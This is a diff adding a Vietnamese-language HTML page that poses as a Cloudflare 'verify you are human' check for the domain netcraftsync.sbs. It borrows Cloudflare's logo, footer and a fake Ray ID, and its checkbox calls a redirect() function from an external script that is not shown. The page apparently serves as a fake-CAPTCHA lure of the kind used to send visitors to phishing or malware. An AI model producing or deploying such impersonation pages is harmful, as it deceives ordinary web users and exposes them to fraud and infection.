@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Đang xác minh trình duyệt của bạn...</title>
+  <link rel="stylesheet" href="../style.css">
+  <script defer src="../script.js"></script>
+</head>
+<body>
+  <h2 id="title">www.netcraftsync.sbs</h2>
+  <p id="description">Đang kiểm tra bảo mật kết nối của bạn...</p>
+
+  <div class="captcha-container">
+    <div class="spinner" id="spinner"></div>
+    <div class="checkbox-wrapper" id="checkbox-wrapper">
+      <div class="checkbox-left">
+        <input type="checkbox" onclick="redirect()">
+        <span id="checkbox-text">Xác minh bạn là con người</span>
+      </div>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/2560px-Cloudflare_Logo.svg.png" alt="Cloudflare" class="captcha-logo">
+    </div>
+  </div>
+
+  <p id="footer-text" style="margin-top: 40px;">www.netcraftsync.sbs cần đánh giá tính bảo mật kết nối của bạn trước khi tiếp tục.</p>
+
+  <div class="footer">
+    Ray ID: <span id="ray-id">...</span><br>
+    Hiệu suất & tính bảo mật của <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
+  </div>
+</body>
+</html>
